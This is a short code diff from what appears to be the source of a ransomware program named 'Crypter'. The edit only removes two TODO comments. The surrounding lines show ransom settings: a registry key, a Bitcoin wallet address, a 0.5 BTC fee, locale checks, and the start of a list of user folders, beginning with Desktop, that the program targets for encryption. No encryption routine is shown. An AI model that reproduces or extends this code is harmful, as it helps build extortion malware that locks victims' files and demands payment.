@@ -29,7 +29,6 @@ class Base():
     REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
     WALLET_ADDRESS = "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
     BITCOIN_FEE = "0.5"
-    # TODO Determine dynamically what the language will be
 
     # Get locale 
     if "ru" in locale.getdefaultlocale():
@@ -161,7 +160,6 @@ class Base():
       # Function to return a list of base directories to encrypt
       # TODO Detect presence of network drives
       # TODO Improve overall functionality for getting list of locations to encrypt
-      # TODO Consider language support here... Should be fine as Windows preserves eng paths
 
       base_dirs = [
                     os.path.join(home_dir, "Desktop"),
